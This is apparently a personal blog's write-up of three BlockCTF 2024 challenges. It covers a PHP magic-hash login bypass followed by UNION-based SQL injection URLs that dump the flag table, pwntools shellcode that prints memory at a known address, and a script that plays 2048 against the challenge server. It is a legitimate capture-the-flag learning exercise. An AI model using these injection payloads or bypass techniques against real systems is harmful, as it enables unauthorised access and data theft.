+++
date = '2024-11-15T12:53:25+01:00'
draft = false
title = 'BlockCTF 2024 - writeup'
author = 'TheMrEviil'
categories = ['writeups']
+++
![image dotgit](/post/blockctf2024/blockctf_logo.png)
## WEB: Juggl3r

Description:
```
Juggl3r
200
The admin panel seems locked behind some odd logic, and the flag is hidden deep. Can you bypass the checks and uncover the secret?

http://54.85.45.101:8080/
```
This challange remember me why i lovd PHP and the same i hate it. When we go on website we have only login page with attempt 5 minut. 
In requests we find version PHP and Apache. Well... lets mix some params in request. When we set username `admin` and  `password[]=1` server response `` Warning: hash() expects parameter 2 to be string, array given in /var/www/html/login.php on line 36` 

This information give a lot of things + challange name Juggl3r. In PHP 7.4 we have some thing like type juggling. It's not good logic to equal variables example:
'123' == 123 : TRUE

but in warning we have information about `hash()` function let's check magic hash. Concept takes advantage of this behavior by using special strings that, when compared to each other with ==, are evaluated as equal to each other (even though they may seem different). In particular, it uses strings that PHP will interpret as a number 0 during comparison.

For example:

"0e12345" == "0" is true because "0e12345" is interpreted as 0.

Popular hashes in PHP are MD5, SHA256 

SHA256:
`34250003024812:0e46289032038065916139621039085883773413820991920706299695051332`


and we got admin. 
Next step in url we can change user_id parameter. but not interesting, but when i add -- we have SQL Syntax ERROR . AWESOME 

now we add a little bit SQL 
`http://54.85.45.101:8080/admin.php?user_id=NULL%20union%20select%201,%20table_name,%201%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%2083--`

and set user_id=NULL because we need spot to display query result. When we have table name `flags` get column name

`http://54.85.45.101:8080/admin.php?user_id=NULL union select 1, COLUMN_NAME, 1 FROM information_schema.columns WHERE table_name = 'flags' LIMIT 1 OFFSET 0--`

now we can read flag
`http://54.85.45.101:8080/admin.php?user_id=NULL union select 1, flag, 1 FROM flags WHERE id = 1--`

and gg `flag{juggl3_inject}`


## PWN: Only Ws

Description:
```
Only Ws
50
The flag is write there. All you have to do is get it.

nc 54.85.45.101 8005
```

When we connect to netcat we have flag address. Write some asm with the best friend ChatGPT
```
from pwn import asm, context

context.arch = 'amd64'

shellcode = asm("""
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x4040a0
    mov rdx, 64
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall
""")

with open("payload1", 'wb') as f:
    f.write(shellcode)
print(shellcode)

```

ok, now we can send a payload to nc and get flag
`flag{kinda_like_orw_but_only_ws}`

## MISC: 2048 ai

Description:

```
2048 ai
150
Can you speedrun 2048?

nc 54.85.45.101 8006
```

Code:
```
import time
import sys
import ctypes
import math
import os
import random
import pwn
from pwn import cyclic_find

pwn.context.log_level = 'debug'

def to_c_board(m):
    board = 0
    i = 0
    for row in m:
        for c in row:
            board |= int(round(math.log(c, 2))) << (4 * i) if c > 0 else 0
            i += 1
    return board

def movename(move):
    return ['w', 's', 'a', 'd'][move]

def find_best_move_for_4x4(board):
    if len(board) != 4 or any(len(row) != 4 for row in board):
        raise ValueError("Input must be a 4x4 matrix.")
    
    c_board = to_c_board(board)
    move = ailib.find_best_move(c_board)

    if move < 0:
        return "No moves available"
    return movename(move)

def parse_board_state(response):
    board_state = []
    lines = response.splitlines()[1:]
    for line in lines[:4]:  # Process only the first 4 lines for rows
        row = [int(x) for x in line.split() if x.isdigit()]
        # Pad row with zeros if less than 4 elements
        while len(row) < 4:
            row.append(0)
        board_state.append(row)

    while len(board_state) < 4:
        board_state.append([0, 0, 0, 0])
    
    return board_state

# Initializing the AI library
for suffix in ['so', 'dll', 'dylib']:
    dllfn = '2048-ai/bin/2048.' + suffix
    if os.path.isfile(dllfn):
        ailib = ctypes.CDLL(dllfn)
        break
else:
    print("Couldn't find 2048 library bin/2048.{so,dll,dylib}! Make sure to build it first.")
    sys.exit()

ailib.init_tables()
ailib.find_best_move.argtypes = [ctypes.c_uint64]

# Example board state
board_state = [
    [0, 0, 0, 0],
    [2, 0, 0, 0],
    [2, 0, 0, 0],
    [0, 0, 0, 0]
]


p = pwn.remote('54.85.45.101',8006)

last_moves = []
while True:
    response = p.recvuntil(b"Enter command(s) (w/a/s/d for movement, q to quit):", timeout=3).decode("UTF-8")
    
    
    if "Congratulations" in response or "Over" in response:
        print(response)
        sys.exit()
    
    board_state = parse_board_state(response)
    print("Stan planszy:", board_state)  
    
    move = find_best_move_for_4x4(board_state)
    print('move', move)
    if move == "No moves available":
        print("No valid moves left. Exiting.")
        sys.exit()
    
    last_moves.append(move)
    p.sendline(move.encode('utf-8'))

```


And we have `flag{f4st3r_th4n_hum4nly_p0ssibl3}`

We finish CTF on #19 :) 

Bye 